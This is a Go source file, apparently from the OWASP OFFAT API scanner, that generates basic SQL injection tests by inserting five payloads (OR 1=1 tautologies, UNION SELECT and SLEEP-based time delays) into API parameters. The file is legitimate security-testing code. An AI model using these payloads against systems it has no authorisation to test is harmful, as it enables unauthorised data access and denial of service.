package tgen

import (
	"github.com/OWASP/OFFAT/src/pkg/parser"
)

// generates very basic sqli API tests
func BasicSqliTest(baseUrl string, docParams []*parser.DocHttpParams, queryParams map[string]string, headers map[string]string, injectionConfig InjectionConfig) []*ApiTest {
	testName := "Basic SQLI Test"
	vulnResponseCodes := []int{500}

	// TODO: implement injection in both keys and values
	payloads := []Payload{
		{InjText: "' OR 1=1 ;--", VulnerableResponseCodes: vulnResponseCodes},
		{InjText: "' UNION SELECT 1,2,3 -- -", VulnerableResponseCodes: vulnResponseCodes},
		{InjText: "' OR '1'='1--", VulnerableResponseCodes: vulnResponseCodes},
		{InjText: "' AND (SELECT * FROM (SELECT(SLEEP(5)))abc)", VulnerableResponseCodes: vulnResponseCodes},
		{InjText: "' AND SLEEP(5) --", VulnerableResponseCodes: vulnResponseCodes},
	}

	injectionConfig.Payloads = payloads

	tests := injectParamIntoApiTest(baseUrl, docParams, queryParams, headers, testName, injectionConfig)

	return tests
}
